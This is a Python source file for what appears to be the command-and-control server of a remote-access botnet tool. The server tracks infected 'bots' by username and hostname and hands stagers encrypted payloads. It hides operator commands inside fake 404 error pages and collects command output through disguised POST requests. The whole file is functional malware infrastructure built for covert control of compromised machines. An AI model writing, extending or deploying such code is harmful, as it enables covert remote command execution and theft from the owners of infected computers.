# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import json
import shutil
from base64 import b64encode, b64decode
from os import fstat
from textwrap import dedent
from threading import Thread
from time import time

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

try:
    from urllib.parse import unquote_plus
except ImportError:
    # Python2 support.
    from urllib import unquote_plus

from server import modules
from server.model import Model, Bot, RequestType, PayloadFactory
from server.view.helper import ViewABC


def start_server(model, view, port):
    """Starts the HTTP server in a separate thread.

    :type model: Model
    :type view: ViewABC
    :type port: int
    """
    # A new instance of the RequestHandler is created for every request.
    _RequestHandler._model = model
    _RequestHandler._view = view
    _RequestHandler._server_port = port

    server_thread = Thread(target=ThreadedHTTPServer(('', port), _RequestHandler).serve_forever)
    server_thread.daemon = True
    server_thread.start()


class _RequestHandler(BaseHTTPRequestHandler):
    """Handles communicating with bots.

    - Responses are hidden in 404 error pages (the DEBUG part)
    - GET requests are used to retrieve the current command
    - Information about the bot along with the request type is sent (base64 encoded) in the Cookie header
    - Handles hosting files specified in the model
    """
    _model = None
    _view = None
    _server_port = None

    def _send_headers(self):
        """Sets the response headers."""
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _send_command(self, command_raw=""):
        """Sends the command to the bot.

        :type command_raw: str
        """
        response = dedent("""\
        <!DOCTYPE html>
        <HTML>
            <HEAD>
                <TITLE>404 Not Found</TITLE>
            </HEAD>
            <BODY>
                <H1>Not Found</H1>
                The requested URL {} was not found on this server.
                <P>
                <HR>
                <ADDRESS></ADDRESS>
            </BODY>
        </HTML>
        """).format(self.path)

        if command_raw != "":
            response += dedent("""\
            <!--
            DEBUG:\n
            {}DEBUG-->
            """.format(command_raw))

        self._send_headers()
        self.wfile.write(response.encode("latin-1"))

    def do_GET(self):
        cookie = self.headers.get("Cookie")

        if not cookie:
            for upload_file in self._model.get_upload_files():
                url_path, local_path = upload_file

                if self.path == ("/" + url_path):
                    with open(local_path, "rb") as input_file:
                        fs = fstat(input_file.fileno())

                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(url_path))
                        self.send_header("Content-Length", str(fs.st_size))
                        self.end_headers()

                        shutil.copyfileobj(input_file, self.wfile)
                    break
            else:
                self._send_command()
        else:
            # Cookie header format: session=<b64_bot_uid>-<b64_JSON_data>
            bot_uid = b64decode(cookie.split("-")[0].replace("session=", "").encode()).decode()
            data = json.loads(b64decode(cookie.split("-")[1].encode()).decode())
            request_type = int(data["type"])

            if request_type == RequestType.STAGE_1:
                # Send back a uniquely encrypted payload which the stager will run.
                payload_options = data["payload_options"]
                loader_options = data["loader_options"]
                loader_name = loader_options["loader_name"]

                self._view.output_separator()
                self._view.output("[{}] Creating encrypted payload using key: {}".format(
                    loader_options["loader_name"], bot_uid
                ), "info")

                payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
                loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)

                self._send_command(b64encode(loader.encode()).decode())
            elif request_type == RequestType.GET_COMMAND:
                username = data["username"]
                hostname = data["hostname"]
                local_path = data["path"]
                system_version = ""
                loader_name = data["loader_name"]

                if not self._model.is_known_bot(bot_uid):
                    # This is the first time this bot connected.
                    bot = Bot(bot_uid, username, hostname, time(), local_path, system_version, loader_name)

                    self._model.add_bot(bot)
                    self._view.on_bot_added(bot)

                    self._send_command()
                else:
                    # Update the bot's session (last online and local path).
                    self._model.update_bot(bot_uid, time(), local_path)

                    has_executed_global, global_command = self._model.has_executed_global(bot_uid)

                    if not has_executed_global:
                        self._model.add_executed_global(bot_uid)
                        self._send_command(global_command)
                    else:
                        self._send_command(self._model.get_command_raw(bot_uid))
            else:
                self._send_command()

    def do_POST(self):
        # Command responses.
        data = bytes(self.rfile.read(int(self.headers.get("Content-Length")))).decode("utf-8")
        data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()).decode())

        response = b64decode(data["response"])
        bot_uid = data["bot_uid"]
        module_name = data["module_name"]
        response_options = dict(data["response_options"])

        if module_name:
            try:
                # Modules will already be loaded at this point.
                modules.get_module(module_name).process_response(response, response_options)

                # Note to self: if there's too many "special" modules here,
                # pass the bot_uid to the process_response method instead.
                if module_name == "remove_bot":
                    self._model.remove_bot(bot_uid)

            except Exception as ex:
                # Something went wrong in the process_response method.
                self._view.output("Module server error:")

                for line in str(ex).splitlines():
                    self._view.output(line)
        else:
            # Command response.
            if response.decode().startswith("Directory changed to"):
                # Update the view's footer to show the updated path.
                new_path = response.decode().replace("Directory changed to: ", "", 1)

                self._model.update_bot(bot_uid, time(), new_path)
                self._view.on_bot_path_change(self._model.get_bot(bot_uid))

            self._view.on_response(response.decode())

        self._send_command()

    def log_message(self, log_format, *args):
        return  # Don't log random stuff we don't care about, thanks.


class ThreadedHTTPServer(HTTPServer, ThreadingMixIn):
    """Handles requests in a separate thread."""
